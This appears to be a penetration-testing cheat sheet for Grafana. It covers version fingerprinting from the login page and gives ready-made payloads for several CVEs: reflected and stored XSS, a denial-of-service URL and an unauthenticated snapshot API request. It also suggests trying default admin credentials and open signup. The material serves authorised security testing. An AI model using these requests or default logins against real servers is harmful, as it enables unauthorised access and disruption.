# Grafana

## Introduction
What would you do if you came across a website that uses Grafana?

## How to Detect
Try to HTTP request to `https://example.com/login` and there is a form login

1. Find the related CVE by checking grafana version
* How to find the grafana version

Try to request to `https://example.com/login` and then check the source code. You will find the version in JSON body `"isEnterprise":false,"latestVersion:"9.0.0","version":"8.3.2"` so 8.3.2 is the grafana version. If you found outdated grafana version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-18548/product_id-47055/Grafana-Grafana.html)

Some example CVE:

- CVE-2021-41174 (Reflected XSS)
```
https://example.com/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
```
- CVE-2020-13379 (Denial of Service)
```
https://example.com/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
```
- CVE-2020-11110 (Stored XSS)
```
POST /api/snapshots HTTP/1.1
Host: example.com
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: {{BaseURL}}
content-type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```
- CVE-2019-15043 (Grafana Unauthenticated API)
```
POST /api/snapshots HTTP/1.1
Host: example.com
Connection: close
Content-Length: 235
Accept: */*
Accept-Language: en
Content-Type: application/json

{"dashboard":{"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
```
2. Default Credentials
```
Try to login using admin as username and password
```
3. Signup Enabled
```
https://example.com/signup
```